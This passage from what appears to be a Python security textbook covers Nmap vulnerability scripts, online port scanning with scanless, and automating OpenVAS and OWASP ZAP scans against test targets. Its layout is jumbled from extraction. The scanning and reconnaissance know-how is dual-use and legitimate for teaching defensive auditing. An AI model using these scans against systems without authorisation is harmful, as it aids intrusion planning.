|_http-server-header: Apache/2.4.7 (Ubuntu) 
| vulners:  
|   cpe:/a:apache:http_server:2.4.7:  
|        CVE-2022-31813  7.5    https://vulners.com/
|        CVE-2022-23943  7.5    https://vulners.com/
|        CVE-2022-22720  7.5    https://vulners.com/
|        CVE-2021-44790  7.5    https://vulners.com/
|        CVE-2021-39275  7.5    https://vulners.com/
|        CVE-2021-26691  7.5    https://vulners.com/
|        CVE-2017-7679   7.5    https://vulners.com/
|        CVE-2017-3167   7.5    https://vulners.com/
|        CNVD-2022-73123 7.5    https://vulners.com/
|        CNVD-2022-03225 7.5    https://vulners.com/
|        CNVD-2021-102386    7.5    https://vulners
..... 
import subprocess 
p = subprocess.Popen(["nmap", "-sV", "--script", "vu

Now that you know how to use the vulners script, let’s move on to
discovering services and vulnerabilities with the vulscan script.
Detecting vulnerabilities with the
Nmap-vulscan script
Vulscan (https://github.com/scipag/vulscan) is an NSE script
that assists Nmap in detecting vulnerabilities on targets based on
services and version detections. First we download the source code
from the GitHub repository:
Then we have to copy the downloaded ﬁles into the folder where the
nmap scripts are stored. In the case of a Linux based operating
system, they are usually located in the path
/usr/share/nmap/scripts/:
For example, the Nmap option -sV allows for service version
detection, which is used to identify potential exploits for the
(output, err) = p.communicate() 
output = output.decode('utf-8').strip() 
print(output) 
$ git clone https://github.com/scipag/vulscan scipag
$ sudo mv /home/linux/Downloads/scipag_vulscan/*.* /

detected vulnerabilities in the system:
When running the vulscan script we can see how it uses diﬀerent
databases to detect vulnerabilities in the services exposed by the
analyzed server.
Port scanning via online services
In the discovery phase of pentesting, it is common that when
scanning an IP or IP range with nmap, the ﬁrewall/IPS may block
your IP address and show the port as closed or ﬁltered, which can
lead to a false negative, i.e. a failure to detect a service that is actually
available on the Internet. It could also be the case that you are
auditing a web service and a WAF detects a payload or behavior that
$ nmap -sV --script=vulscan/vulscan.nse  scanme.nmap
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2
| vulscan: VulDB - https://vuldb.com: 
| [12724] OpenSSH up to 6.6 Fingerprint Record Check
|  
| MITRE CVE - https://cve.mitre.org: 
| [CVE-2012-5975] The SSH USERAUTH CHANGE REQUEST fe
| [CVE-2012-5536] A certain Red Hat build of the pam
| [CVE-2010-5107] The default configuration of OpenS
| [CVE-2008-1483] OpenSSH 4.3p2, and probably other 
| [CVE-2007-3102] Unspecified vulnerability in the l
| [CVE-2004-2414] Novell NetWare 6.5 SP 1.1, when in
........... 

also restricts access from your IP address, which could be considered
that of an aĴacker.
There are numerous sites that allow you to perform a remote scan of
the most common ports online. We can quickly check whether your
IP address has been banned or the service is down, without the need
to change connections by trying diﬀerent VPNs or making
anonymous requests.
Scanless port scanner
Scanless (https://github.com/vesche/scanless) is a Python 3
command-line utility and library for using websites that can perform
port scans on your behalf. As described in the GitHub project, it is a
tool that can be run from a terminal or as a Python library and uses
Internet services to run scans. This means that information can be
obtained about the open ports on a particular target without
interacting directly with it. These would be semi-passive activities
and can ﬁt into what we know as OSINT techniques.
To install it we can use the source code found in the GitHub
repository or the following command:
$ pip install scanless 
By running the script without parameters, we can see the options it
oﬀers:
$ scanless 
usage: scanless.py [-h] [-t TARGET] [-s SCANNER] [-l

With the -l option, we can see the scanners we have available:
With the -s parameter, we can execute the scan using a speciﬁc
online service:
scanless, public port scan scrapper 
optional arguments: 
  -h, --help            show this help message and e
  -t TARGET, --target TARGET 
                        ip or domain to scan 
  -s SCANNER, --scanner SCANNER 
                        scanner to use (default: you
  -l, --list            list scanners 
  -a, --all             use all the scanners 
$ scanless -l 
+----------------+----------------------------------
| Scanner Name   | Website                          
+----------------+----------------------------------
| hackertarget   | https://hackertarget.com         
| ipfingerprints | https://www.ipfingerprints.com   
| pingeu         | https://ping.eu                  
| spiderip       | https://spiderip.com             
| standingtech   | https://portscanner.standingtech
| viewdns        | https://viewdns.info             
| yougetsignal   | https://www.yougetsignal.com     
+----------------+----------------------------------

This tool also oﬀers the possibility to automate the scanning process
using the Python API. In the following script, we use the Scanless
$ scanless -t scanme.nmap.org -s ipfingerprints 
Running scanless v2.1.6... 
ipfingerprints: 
Host is up (0.14s latency). 
Not shown: 484 closed ports 
PORT    STATE    SERVICE 
22/tcp  open     ssh 
80/tcp  open     http 
111/tcp filtered rpcbind 
135/tcp filtered msrpc 
136/tcp filtered profile 
137/tcp filtered netbios-ns 
138/tcp filtered netbios-dgm 
139/tcp filtered netbios-ssn 
445/tcp filtered microsoft-ds 
Device type: general purpose|WAP|storage-misc|media 
Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (92%), 
Infomir embedded (89%), Tandberg embedded (89%), Ubi
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:l
cpe:/o:linux:linux_kernel:2.6.32 cpe:/h:ubnt:airmax_
cpe:/h:hp:p2000_g3 cpe:/h:infomir:mag-250 cpe:/o:ubn
Aggressive OS guesses: Linux 2.6.32 - 3.13 (92%), Ub
2.6.32) (92%), Linux 2.6.22 - 2.6.36 (91%), Linux 3
2.6.32 (90%), Linux 3.2 - 4.6 (90%), Linux 2.6.32 - 
- 4.6 (89%) 
No exact OS matches for host (test conditions non-id
Network Distance: 7 hops 

class of the scanless module to create an instance of an object that
allows us to execute the scan() method. You can ﬁnd the following
code in the scanless_service.py ﬁle:
import scanless 
import json 
sl = scanless.Scanless() 
print("1.ipfingerprints") 
print("2.spiderip") 
print("3.standingtech") 
print("4.viewdns") 
print("5.yougetsignal") 
option=int(input("Enter service option:")) 
service=''
if option==1:  
    service="ipfingerprints"
elif option==2: 
    service="spiderip"
elif option==3:  
    service="standingtech"
elif option==4:  
    service="viewdns"
elif option==5:  
    service="yougetsignal" 
output = sl.scan('scanme.nmap.org',scanner=service) 
print(output['parsed']) 
json_output= json.dumps(output,indent=2) 
print(json_output) 

In the previous code, we ﬁrst import the scanless module and
create an object with the Scanless class. Starting from this object, a
scan is executed with the target and the service using the scan()
method. We could run the above script by selecting one of the
available services. In the following execution we use the
yougetsignal service:
The previous output returns a dictionary type structure, which
allows access to each of the scan results in an ordered way. Finally,
we could convert from a dictionary type structure to a JSON format
structure with the dumps() method using the json module.
Summary
One of the objectives of this chapter was to ﬁnd out about the
modules that allow a port scanner to be performed on a speciﬁc
domain or server. One of the best tools to perform port scouting in
Python is python-nmap, which is a module that serves as a wrapper
for the nmap command. As we have seen in this chapter, Nmap can
$ python scanless_service.py 
1.ipfingerprints 
2.spiderip 
3.standingtech 
4.viewdns 
5.yougetsignal 
Enter service option:5 
[{'port': '21', 'state': 'closed', 'service': 'ftp',

give us a quick overview of what ports are open and what services
are running in our target network, and the NSE is one of Nmap’s
most powerful and ﬂexible features, eﬀectively turning Nmap into a
vulnerability scanner.
In the next chapter, we will explore open-source vulnerability
scanners such as OpenVAS and learn how to connect with them
from Python to extract information related to vulnerabilities found
in servers and web applications.
Questions
As we conclude, here is a list of questions for you to test your
knowledge regarding this chapter’s material. You will ﬁnd the
answers in the Assessments section of the Appendix:
1. Which method from the PortScanner class is used to perform
scans synchronously?
2. Which method from the PortScanner class is used to perform
scans asynchronously?
3. How can we launch an asynchronous scan on a given host and
port if we initialize the object with the
self.portScannerAsync = nmap.PortScannerAsync()
instruction?
4. How can we launch a synchronous scan on a given host and
port if we initialize the object with the self.portScanner =
nmap.PortScanner() instruction?
5. Which function is necessary to deﬁne when we perform
asynchronous scans using the PortScannerAsync() class?

Further reading
With the following links, you can ﬁnd more information about tools
mentioned and other tools related to extracting information from
servers:
python-nmap: https://xael.org/pages/python-nmap-
en.html
Nmap scripts: https://nmap.org/nsedoc/scripts
SPARTA port scanning: SPARTA
(https://github.com/secforce/sparta) is a tool developed
in Python that allows port scanning and pentesting for services
that are opened. This tool is integrated with the Nmap tool for
port scanning and will ask the user to specify a range of IP
addresses to scan. Once the scan is complete, SPARTA will
identify any machines, as well as any open ports or running
services.
Join our community on Discord
Join our community’s Discord space for discussions with the author
and other readers:
https://packt.link/SecNet


————————— Section 4
—————————
Server Vulnerabilities and
Security in Web Applications
In this section, you will learn how to automate the vulnerabilities
scanning process to identify server vulnerabilities and analyze the
security in web applications. Also, we cover how to get information
about vulnerabilities from CVE, NVD, and vulners databases.
This part of the book comprises the following chapters:
Chapter 9, Interacting with Vulnerability Scanners
Chapter 10, Interacting with Server Vulnerabilities in Web
Applications
Chapter 11, Obtain Information from Vulnerabilities Database

9
Interacting with Vulnerability
Scanners
In this chapter, we will learn about OpenVAS vulnerability scanners
and the reporting tools that they provide for reporting the
vulnerabilities that we ﬁnd in servers and web applications. Also, we
will cover how to use them programmatically with Python via the
owasp-zap and python-gvm modules. After geĴing information
about a system, including its services, ports, and operating systems,
these tools provide a way to identify vulnerabilities in the diﬀerent
databases available on the internet, such as CVE and NVD.
Both the tools we are about to learn about are vulnerability detection
applications widely used by computer security experts when they
must perform audit tasks that are part of a vulnerability
management program. With the use of these tools, together with the
ability to search vulnerability databases, we can obtain precise
information on the diﬀerent vulnerabilities present in the target we
are analyzing, and can thus take steps to secure it.
The following topics will be covered in this chapter:
Introducing the OpenVAS vulnerability scanner

Accessing OpenVAS with Python using the python-gmv
module
Introducing OWASP zap as an automated security testing tool
Interacting with OWASP zap using Python with the owasp-zap
module
WriteHat as a pentesting report tool wriĴen in Python
Technical requirements
The examples and source code for this chapter are available in the
GitHub repository at
https://github.com/PacktPublishing/Python-for-Security-
and-Networking.
This chapter requires the installation of the owasp-zap and python-
gvm modules. You can use your operating system’s package
management tool to install them.
Here’s a quick how-to on installing these modules in a Debian-based
Linux operating system environment with Python 3 using the
following commands:
$ sudo apt-get install python3 
$ sudo apt-get install python3-setuptools 
$ sudo pip3 install python-gvm 
$ sudo pip3 install python-owasp-zap-v2.4 
For readers that are using other operating systems such as Windows
or macOS, we encourage you to read the individual READMEs in

the oﬃcial documentation.
Check out the following video to see the Code in Action:
https://packt.link/Chapter09.
Introducing the OpenVAS
vulnerability scanner
Open Vulnerability Assessment System (OpenVAS) (available at
https://www.openvas.org) is one of the most widely used open-
source vulnerability scanning and management solutions. This tool
is designed to assist network/system administrators in vulnerability
identiﬁcation and intrusion detection tasks.
OpenVas provides a Community Edition that has several services
and tools for vulnerability assessment. A vulnerability is a weakness
or ﬂaw in a system. Vulnerability assessment is the process of
identifying and classifying vulnerabilities present in a system or
application with the express goal of remediation. Any vulnerability
assessment tool has the following characteristics:
It allows us to classify the resources of the system we are
analyzing.
It provides the ability to detect potential threats (vulnerabilities)
for each resource found.
It performs a classiﬁcation of the vulnerabilities detected in
order to subsequently apply the corresponding patches. This
classiﬁcation is typically achieved with a severity level as a
result of some scoring mechanism like CVSS (Common
Vulnerability Scoring System).

Next, we are going to review the main steps to install OpenVAS on
your operating system.
Installing the OpenVAS vulnerability
scanner
The fastest way to install OpenVAS on your local machine is to use
Docker. First, we need to install Docker and Docker Compose. We
can install both with the following command:
$ sudo apt install docker.io docker-compose 
Once both are installed, follow the instructions at
https://greenbone.github.io/docs/latest/22.4/container/
index.html, where we have the ﬁle docker-compose.yml, which
will generate the images and start the necessary containers to deploy
the application.

Figure 9.1: OpenVAS Docker Compose
It is possible to just copy and paste the Docker Compose ﬁle.
Alternatively, it can be downloaded with the following command:
Once we have downloaded the ﬁle, we can start the necessary
containers with the following command:
OpenVAS has three services:
$ curl -f -L https://greenbone.github.io/docs/latest
$ docker-compose -f $DOWNLOAD_DIR/docker-compose.yml

Scanning service: This is responsible for performing an analysis
of vulnerabilities.
Manager service: This is responsible for performing tasks such
as ﬁltering or classifying the results of the analysis. Also, this
service is used to control the databases that contain the
conﬁguration and user administration functionalities, including
groups and roles.
Client service: This is used as a graphical web interface to
conﬁgure OpenVAS and present the results obtained or the
execution of reports.
Another option to install the OpenVAS server on localhost is by
using a Docker image that we can ﬁnd at
https://immauss.github.io/openvas. If you have Docker
installed, it would be enough to download the image and run the
following command to run the services in diﬀerent containers:
When the setup process is complete, all necessary OpenVAS
processes start, and the web interface opens automatically. We could
check whether there is a container executing in our localhost
machine with the following command:
$ docker run --detach --publish 9392:9392 -e PASSWOR
$ docker ps 
CONTAINER ID   IMAGE             COMMAND            
9d1484c6188d   immauss/openvas   "/scripts/start.sh"

The web interface runs locally on port 9392 with SSL and can be
accessed through the URL https://localhost:9392. OpenVAS
will also conﬁgure and manage the account and automatically
generate a password for this account.
Understanding the web interface
Using the Graphical User Interface (GUI), you can log in with the
admin username and the password generated during the initial
conﬁguration:

Figure 9.2: OpenVAS login GUI
Once we have logged in to the web interface, we are redirected to the
Greenbone Security Assistant dashboard. At this point, we can start
to conﬁgure and run vulnerability scans.
Once the interface is loaded, you have the following options to
conﬁgure and start the OpenVAS scanner and manager:

Figure 9.3: OpenVAS dashboard
The user interface is divided into diﬀerent menu options, out of
which we highlight the following:
Dashboard: A customizable dashboard that presents
information related to vulnerability management, scanned
hosts, recently published vulnerability disclosures, and other
useful information
Scans: Allows you to create new scan tasks or modify
previously created ones
Assets: Lists the hosts that have been analyzed along with the
number of vulnerabilities identiﬁed
SecInfo: Stores detailed information about all the vulnerabilities
and their CVE IDs

Conﬁguration: Allows you to conﬁgure the objectives, assign
access credentials, conﬁgure the scan (including NVT selection,
and general and speciﬁc parameters for the scan server),
schedule scans, and conﬁgure the generation of reports
Administration: Allows you to manage the users, groups, and
roles governing access to the application
Now that we have installed OpenVAS and understand its interface,
it is time we learned how to use it to scan targets.
Scanning a target using OpenVAS
The process of scanning a target can be summarized by the
following phases:
1. Creating the target
2. Creating the task
3. Scheduling the task to run
4. Analyzing the report
To create a target, use the Conﬁguration tab.

Figure 9.4: OpenVAS Targets conﬁguration
To create a task, use the Scans option tab.
Figure 9.5: OpenVAS tasks scans

We will perform these steps in the following subsections.
Creating the target
To create the target, click on the icon with a white star on a blue
background. A window will open, in which we will see the
following ﬁelds:
Figure 9.6: OpenVAS New Target window
In the ﬁrst step, it is necessary to conﬁgure the target we intend to
scan. From within the target’s submenu under the Conﬁguration

tab, we can deﬁne a host or a range of hosts. Here, you need to make
the following selections:
Given the target name, you can check the Manual option and
enter the IP address in the Hosts box.
In the Hosts ﬁeld, we can enter the address of a host, for
example: 10.0.0.129; a range of hosts, for example:
10.0.0.10-10.0.0.129; a range of hosts in short format, for
example: 192.168.200.10-50; hosts with CIDR notation, for
example: 10.0.0.0/24; and even host names.
In the port list ﬁeld, we can introduce a list of ports used for the
scanning process.
OpenVAS already includes a series of templates with the most
common ports. For example, we could select all the TCP and
UDP ports included in the IANA standard. In the Port List
dropdown, we can choose which ports we want to scan,
although it would be advisable to analyze all TCP and UDP
ports. In this way, we could obtain the open ports for
connection-oriented and non-connection-oriented services.
We can add diﬀerent destinations, either IP ranges or individual
computers, and deﬁne diﬀerent port ranges or detection
methods. Also, we can specify whether we want to check the
credentials for access by SSH or SMB. With this done, just click
the Create buĴon.
Once the target conﬁguration has been set, we can continue
generating a new task to run the analysis and evaluation.
Creating the task

OpenVAS manages the execution of a scan through tasks. A task
consists of a target and a scan conﬁguration. By execution, we mean
starting the scan, and as a result, we will get a report with the results
of the scan. The following are the conﬁguration options for a new
task:
Figure 9.7: OpenVAS New Task window
The next step would be to create a task that allows us to launch the
scan later. Among the main parameters to be conﬁgured when
creating the task, we can highlight the following:

Scan Targets: In this option, a previously created “target” is
selected. You can also create the target by clicking on the option
next to the drop-down list.
Alerts: We can select a previously conﬁgured alert. Alerts can be
useful for geĴing updates on tasks. You can create an alert by
clicking on the option that appears next to the drop-down list.
Schedule: A task can be scheduled to be repeated periodically
or done at a speciﬁc time. In this option, we can select a
previously created schedule or create our own.
Min QoD: This stands for minimum quality of detection, and
with this option, you can ask OpenVAS to show possible real
threats.
Scanner: We can select between two options: OpenVAS Default
and CVE.
Scan Conﬁg: This option allows you to select the intensity of the
scan. If we select a deeper scan, it may take several hours to
perform it:
a. Discovery is the equivalent of issuing a ping command to
the entire network, where it tries to ﬁnd out which
computers are active and the operating systems running on
them.
b. Full and fast performs a quick scan.
c. Full and very deep is slower than Full and fast, but also
gets more results.
Maximum concurrently executed NVTs per host: With this
option, you can identify the number of vulnerabilities to be
tested for each target.

Maximum concurrently scanned hosts: With this option, you
can deﬁne the maximum number of executions to be run in
parallel. For example, if you have diﬀerent goals and tasks, you
can run more than one scan simultaneously.
Figure 9.8: OpenVAS scanning tasks
In the Scanning | Tasks section, we can ﬁnd the status of the
diﬀerent scans that have been performed already. For each item, we
can see information about the scan target and the conﬁguration
options we used to create it.
Analyzing reports
In the Scan Management | Reports section, we can see a list of
reports for each of the tasks that have been executed. By clicking on
the report name, we can get an overview of all the vulnerabilities

discovered in the analyzed target. In the following screenshot, we
can see a summary of the results categorized in order of severity
(high, medium, and low):
Figure 9.9: OpenVAS summary scan report
For each of the running tasks, we can access the details, including a
list of vulnerabilities that have been found.

Figure 9.10: OpenVAS summary scan report details
If we are going to analyze the details of the vulnerabilities detected,
we can classify them by level of severity, by operating system, by
host, and by port, as shown in the previous screenshot.
When we click on any vulnerability name, we get an overview of the
details regarding the vulnerability. The following details apply to a
vulnerability related to the use of default credentials to access the
OpenVAS Manager tool:

Figure 9.11: OpenVAS vulnerability details
On the previous screen, we can see the details of the vulnerabilities
that have been found. For each vulnerability, in addition to a general
description of the problem, we can see some details on how to detect
the vulnerability and how to solve the problem (usually, this
involves updating the version of a speciﬁc library or software).

Figure 9.12: OpenVAS vulnerability details
Another interesting feature is that it can detect the TLS certiﬁcates
found on the scanned targets.

Figure 9.13: OpenVAS TLS certiﬁcates
OpenVAS provides a database that enables security researchers and
software developers to identify which version of a program ﬁxes
speciﬁc problems. As shown in the previous screenshot, we can also
ﬁnd a link to the software manufacturer’s website with details on
how the vulnerability can be ﬁxed.
When the analysis task has been completed, we can click on the date
of the report to view the possible risks that we can ﬁnd in the
machine we are analyzing.
Vulnerabilities databases
The OpenVAS project maintains a database of Network
Vulnerability Tests (NVTs) synchronized with servers to update
vulnerability tests. The scanner has the capacity to execute these
NVTs, made up of routines that check for the presence of a speciﬁc
known or potential security problem in the systems:

Figure 9.14: The OpenVAS NVTs database
In the following screenshot, we can see details of a speciﬁc NVT
registered in the OpenVAS vulnerability scanner.

Figure 9.15: NVT vulnerability details
The OpenVAS project also maintains a database of CVEs (the
OpenVAS CVE feed) that synchronize with servers to update
vulnerability tests. CVE (Common Vulnerabilities and Exposures)
is a list of standardized names for vulnerabilities and other
information security exposures. It aims to standardize the names of
all publicly known vulnerabilities and security exposures. In the
following screenshot, we can see a list of CVEs registered in the
OpenVAS vulnerability scanner.

Figure 9.16: The OpenVAS CVEs database
The CVE vulnerability nomenclature standard
(https://cve.mitre.org) is used to facilitate the exchange of
information between diﬀerent databases and tools. Each of the
vulnerabilities listed links to various sources of information as well
as to available patches or solutions provided by manufacturers and
developers. It is possible to perform advanced searches with the
option to select diﬀerent criteria, such as vulnerability type,
manufacturer, and type of impact.

Figure 9.17: CVE vulnerability details
In this section, we have reviewed the capabilities of OpenVAS as an
open-source vulnerability scanner used for the identiﬁcation and
correction of security ﬂaws. Next, we are going to review how we
can extract information from and interact with the OpenVAS
vulnerability scanner using the python-gmv module.
Accessing OpenVAS with Python
We could automate the process of geĴing the information stored in
the OpenVAS server using the python-gmv module. This module
provides an interface for interacting with the OpenVAS server’s
vulnerability scan functionality. You can get more information about
this module at https://pypi.org/project/python-gvm. The API
documentation is available at https://python-
gvm.readthedocs.io/en/latest.

One of the most direct ways to connect to the server from Python is
using the socket that we have available with one of the volumes that
Docker mounts for the application. To see the mounted volumes, we
can use the following command:
To access the details of the volume we are interested in, we can use
the following command:
$ sudo docker volume ls 
DRIVER    VOLUME NAME 
local     greenbone-community-edition_cert_data_vol 
local     greenbone-community-edition_data_objects_v
local     greenbone-community-edition_gpg_data_vol 
local     greenbone-community-edition_gvmd_data_vol 
local     greenbone-community-edition_gvmd_socket_vo
local     greenbone-community-edition_notus_data_vol
local     greenbone-community-edition_ospd_openvas_s
local     greenbone-community-edition_psql_data_vol 
local     greenbone-community-edition_psql_socket_vo
local     greenbone-community-edition_redis_socket_v
local     greenbone-community-edition_scap_data_vol 
local     greenbone-community-edition_vt_data_vol 
$ sudo docker inspect greenbone-community-edition_gv
[ 
    { 
        "CreatedAt": "2023-04-27T06:11:46-04:00", 
        "Driver": "local", 
        "Labels": { 

In the output of the previous command, we can see the path
associated with the socket we need to connect to the server from our
Python script.
In the following example, we are going to connect with the
OpenVAS server on localhost and get the version. You can ﬁnd the
following code in the openvas_get_version_socket.py ﬁle:
            "com.docker.compose.project": "greenbone
            "com.docker.compose.version": "1.29.2", 
            "com.docker.compose.volume": "gvmd_socke
        }, 
        "Mountpoint": "/var/lib/docker/volumes/green
        "Name": "greenbone-community-edition_gvmd_so
        "Options": null, 
        "Scope": "local" 
    } 
] 
from gvm.connections import UnixSocketConnection 
from gvm.protocols.gmp import Gmp 
# path to unix socket 
path = '/var/lib/docker/volumes/greenbone-community-
connection = UnixSocketConnection(path=path) 
# using the with statement to automatically connect 
with Gmp(connection=connection) as gmp: 
    # get the response message returned as a utf-8 e
    response = gmp.get_version() 
    # print the response message 
    print(response) 

In the previous code, we used the UnixSocketConnection class,
which uses a socket connection to connect with the server at
localhost. The following is an example of the output of the previous
script, which returns an XML document with the OpenVAS version:
In the following example, we are geĴing information about the tasks,
targets, scanners, and conﬁgs registered in the server. You can ﬁnd
the following code in the openvas_get_information.py ﬁle:
$ sudo python openvas_get_version_socket.py 
<get_version_response status="200" status_text="OK">
import gvm 
from gvm.connections import UnixSocketConnection 
from gvm.protocols.gmp import Gmp 
from gvm.transforms import EtreeTransform 
from gvm.xml import pretty_print 
path = '/var/lib/docker/volumes/greenbone-community-
connection = UnixSocketConnection(path=path) 
transform = EtreeTransform() 
with Gmp(connection, transform=transform) as gmp: 
    version = gmp.get_version() 
    print(version) 
    pretty_print(version) 
    gmp.authenticate('admin', 'admin') 

In the ﬁrst part of the preceding code, we initialize the connection
with the OpenVAS server with the authenticate() method using
default credentials.
In this method, we provide the username and password needed for
authentication. In the following part of the code, we use the diﬀerent
methods provided by the API for geĴing the information stored in
the server:
    users = gmp.get_users() 
    tasks = gmp.get_tasks() 
    targets = gmp.get_targets() 
    scanners = gmp.get_scanners() 
    configs = gmp.get_scan_configs() 
    feeds = gmp.get_feeds() 
    nvts = gmp.get_nvts() 
In the following part of the code, we continue accessing diﬀerent
methods that provide the API with information about scanners,
conﬁgs, feeds, and NVTs:
    print("Users\n------------") 
    for user in users.xpath('user'): 
        print(user.find('name').text) 
    print("\nTasks\n------------") 
    for task in tasks.xpath('task'): 
        print(task.find('name').text) 
    print("\nTargets\n-------------") 
    for target in targets.xpath('target'): 
        print(target.find('name').text) 

With the previous code, we can get the information stored on the
OpenVAS server related to tasks, targets, scans, and NVTs. We could
use this information to gain more insight into which targets we have
analyzed and obtain an up-to-date NVT list to detect more critical
vulnerabilities.
Introducing OWASP ZAP as an
automated security testing tool
OWASP Zed AĴack Proxy (ZAP) is a web application scanner, a
ﬂagship project developed and maintained by the OWASP
foundation. This tool provides a wide range of features for
penetration testing and security analysis and claims to be the
world’s most used tool for web application vulnerability testing.
ZAP is an open-source project available for Windows, macOS, and
        print(target.find('hosts').text) 
    print("\nScanners\n-------------") 
    for scanner in scanners.xpath('scanner'): 
        print(scanner.find('name').text) 
    print("\nConfigs\n-------------") 
    for config in configs.xpath('config'): 
        print(config.find('name').text) 
    print("\nFeeds\n-------------") 
    for feed in feeds.xpath('feed'): 
        print(feed.find('name').text) 
    print("\nNVTs\n-------------") 
    for nvt in nvts.xpath('nvt'): 
        print(nvt.attrib.get('oid'),"-->",nvt.find(

Linux operating systems. You can get the last version from
https://www.zaproxy.org/download/.
Figure 9.18: OWASP ZAP installers
If you are working on a Linux-based operating system, you could
download the following ﬁle,
https://github.com/zaproxy/zaproxy/releases/download/v2
.12.0/ZAP_2.12.0_Linux.tar.gz, and unzip the tar.gz ﬁle in
your computer. When you unzip it, you’ll get the following ﬁle
structure:
$ ls -l 
drwxr-xr-x 2 linux linux    4096  2 de gen.   1970 d
-rw-r--r-- 1 linux linux   10488 26 de gen.  20:39 h
drwxr-xr-x 2 linux linux    4096  2 de gen.   1970 l
drwxr-xr-x 2 linux linux    4096  2 de gen.   1970 l

To run OWASP ZAP, just launch the zap.sh script. Remember that
you must have a version of Java installed on your computer. In this
case, we are using Java version 11.
drwxr-xr-x 2 linux linux    4096  2 de gen.   1970 l
drwxr-xr-x 2 linux linux    4096  2 de gen.   1970 p
-rw-r--r-- 1 linux linux    2211  2 de gen.   1970 R
drwxr-xr-x 3 linux linux    4096  2 de gen.   1970 s
drwxr-xr-x 2 linux linux    4096  2 de gen.   1970 x
-rw-r--r-- 1 linux linux 5439660  2 de gen.   1970 z
-rw-r--r-- 1 linux linux     200  2 de gen.   1970 z
-rw-r--r-- 1 linux linux  123778  2 de gen.   1970 z
-rwxr-xr-x 1 linux linux    3973  2 de gen.   1970 z
$ ./zap.sh  
Found Java version 11.0.15 
Available memory: 7816 MB 
Using JVM args: -Xmx1954m 
3654 [main] INFO  org.zaproxy.zap.GuiBootstrap - OWA

Figure 9.19: Starting OWASP ZAP
ZAP allows the automation of various testing procedures, can
handle diﬀerent authentication mechanisms, and, ﬁnally, can
automatically crawl through all available subpages of the application
while aggressively trying all input methods (active scan). It operates
in so-called sessions. In a session, every fragment of interaction with
the investigated web page is recorded and saved into a database.
These saved actions (HTTP requests and responses) can be later
revisited and examined.

Using OWASP ZAP
ZAP works as a spider or crawler, and it has the capacity to explore
the speciﬁed site and ﬁnd the URLs that are available on the site.
There are two kinds of spiders: traditional and AJAX spiders. AJAX
spiders are mainly for JavaScript applications. ZAP has two
scanners, passive and active, that are used for scanning and ﬁnding
vulnerabilities.
The passive scanner monitors the requests to and responses and
identiﬁes vulnerabilities.
The active scanner aĴacks and manipulates the header for
ﬁnding vulnerabilities.
From the main ZAP page, we have two main options: Automated
Scan and Manual Explore.
Figure 9.20: OWASP ZAP main page
From the main ZAP page, click Automated Scan and you’ll get the
following options, where you can enter an URL to aĴack.

Figure 9.21: OWASP ZAP Automated Scan
When you click on the AĴack buĴon, you will see how the URL is
processing in the Spider and Active Scan tabs.
Figure 9.22: OWASP ZAP Active Scan

In the following image, we can see the result of running an active
scan where we can see the alerts corresponding to vulnerabilities it
has detected on the website we are analyzing.
Figure 9.23: OWASP ZAP Alerts
In addition to using OWASP ZAP as a stand-alone tool to perform
pentesting tasks, it is possible to start the ZAP engine in “daemon”
or “headless” mode and pull up its REST API to programmatically
launch scans from Python. The API is quite complete and allows you
to run automated scans both passively and actively.
To do this, the API must be activated via the menu item Extras |
Options | API, where you can make the conﬁguration required to
access the API.

Figure 9.24: OWASP ZAP API
Once we have analyzed OWASP ZAP as a tool to launch scans on a
website, we continue analyzing the module we have in Python to
perform the scans programmatically. At this point, it is important to
take note of the API key to use it in our Python scripts to automate
the scanning process.

Interacting with OWASP ZAP using
Python
The ZAP Python API can be installed using the pip install
command and by specifying the OWASP ZAP version, as explained
here: https://github.com/zaproxy/zap-api-python.
$ pip install python-owasp-zap-v2.4 
Once the ZAP Python package is installed, you can import it with
the following import:
Basically, we need to use a spider object and call some methods for
scanning the website:
We could start with a simple script that allows us to obtain the
internal and external links of the website. For this task, we could use
the scan() method from the spider object, which is used to
automatically discover new resources (URLs) from a particular
>>> from zapv2 import ZAPv2 
>>> zap=ZAPv2() 
>>> dir(zap) 
['_ZAPv2__apikey', '_ZAPv2__proxies', '_ZAPv2__valid
>>> dir(zap.spider) 
[.... 'option_parse_git', 'option_parse_robots_txt',

website. You can ﬁnd the following code in the basic_spider.py
ﬁle:
In the previous code, once the spider API is called, it waits for its
completion by pooling status API. When status equals 100, the
spidering process is complete.
import time 
from zapv2 import ZAPv2 
apiKey='<YOUR_API_KEY>' 
target = 'http://testphp.vulnweb.com/' 
zap = ZAPv2(apikey=apiKey) 
print('Spidering target {}'.format(target)) 
scanID = zap.spider.scan(target) 
while int(zap.spider.status(scanID)) < 100: 
    print('Spider progress %: {}'.format(zap.spider
    time.sleep(1) 
print('Spider has completed!') 
print('\n'.join(map(str, zap.spider.results(scanID))
$ python basic_spider.py 
Spidering target http://testphp.vulnweb.com/ 
Spider progress %: 0 
.. 
Spider progress %: 97 
Spider has completed! 
http://testphp.vulnweb.com/categories.php 
http://testphp.vulnweb.com/secured/style.css 
http://testphp.vulnweb.com/showimage.php?file=./pict

In the following example, we are using the ajaxSpider object
instead of the previous spider object. You can ﬁnd the following
code in the ajax_spider.py ﬁle:
In the previous code, we are executing the loop until the AJAX
spider has ﬁnished or the timeout has been exceeded.
We could continue with a passive scan. For this task, we can use the
API zap.pscan.records_to_scan, which waits until all the
http://testphp.vulnweb.com/showimage.php?file=./pict
http://testphp.vulnweb.com/signup.php 
import time 
from zapv2 import ZAPv2 
apiKey='<YOUR_API_KEY>' 
target = 'http://testphp.vulnweb.com/' 
zap = ZAPv2(apikey=apiKey) 
print('Ajax Spider target {}'.format(target)) 
scanID = zap.ajaxSpider.scan(target) 
timeout = time.time() + 60*2
while zap.ajaxSpider.status == 'running': 
    if time.time() > timeout: 
        break 
    print('Ajax Spider status:' + zap.ajaxSpider.sta
    time.sleep(2) 
print('Ajax Spider completed') 
ajaxResults = zap.ajaxSpider.results(start=0, count=
print(ajaxResults) 

records are scanned. A passive scan just looks at the requests and
responses. This method is good for ﬁnding problems like missing
security headers or missing anti-CSRF (Cross-Site Request Forgery)
tokens. You can ﬁnd the following code in the passive_scan.py
ﬁle:
import time 
from pprint import pprint 
from zapv2 import ZAPv2 
apiKey='<YOUR_API_KEY>' 
target = 'http://testphp.vulnweb.com/' 
zap = ZAPv2(apikey=apiKey) 
print('Accessing target {}'.format(target)) 
zap.urlopen(target) 
time.sleep(2) 
